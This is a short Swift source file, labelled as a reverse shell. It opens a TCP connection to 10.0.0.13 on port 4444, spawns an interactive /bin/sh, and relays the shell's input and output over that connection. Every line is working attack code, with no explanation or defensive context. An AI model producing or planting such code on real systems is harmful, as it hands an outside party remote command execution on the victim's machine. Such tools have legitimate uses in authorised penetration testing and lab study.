// Swift reverse shell
import Foundation
import Network

let host = NWEndpoint.Host("10.0.0.13")
let port = NWEndpoint.Port(rawValue: 4444)!
let conn = NWConnection(host: host, port: port, using: .tcp)
let queue = DispatchQueue(label: "rs")

conn.stateUpdateHandler = { state in
    if case .ready = state {
        let task = Process()
        task.launchPath = "/bin/sh"
        task.arguments = ["-i"]
        let stdin = Pipe()
        let stdout = Pipe()
        task.standardInput = stdin
        task.standardOutput = stdout
        task.standardError = stdout
        stdout.fileHandleForReading.readabilityHandler = { fh in
            conn.send(content: fh.availableData, completion: .contentProcessed { _ in })
        }
        func recv() {
            conn.receive(minimumIncompleteLength: 1, maximumLength: 4096) { data, _, _, _ in
                if let d = data { stdin.fileHandleForWriting.write(d) }
                recv()
            }
        }
        try? task.run()
        recv()
    }
}
conn.start(queue: queue)
RunLoop.main.run()
